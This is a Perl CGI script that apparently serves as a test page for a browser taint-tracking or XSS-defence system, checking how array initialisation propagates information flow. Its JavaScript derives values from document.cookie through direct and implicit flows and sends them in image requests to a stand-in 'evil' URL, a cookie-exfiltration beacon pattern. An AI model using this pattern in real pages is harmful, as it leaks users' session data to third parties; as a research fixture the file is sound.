#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_INITELEM";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		var notevil = 42;
		var dut = [ notevil ];
		var url = "$imgevilurl?normal=" + dut[0];
		document.images[0].src = url;
		
		// if with evil val 
		var notevil2 = 42;
		if ($evil) {
			var dut2 = [ notevil2];
		}
		var url2 = "$imgevilurl?if=" + dut2[0];
		document.images[1].src = url2;
		
		// normal usage 
		var evil = 2;
		if ($evil) {
			evil = 1;
		}
		var notevil3 = evil;
		var dut3 = [notevil3];
		var url3 = "$imgevilurl?isevil=" + dut3[0];
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
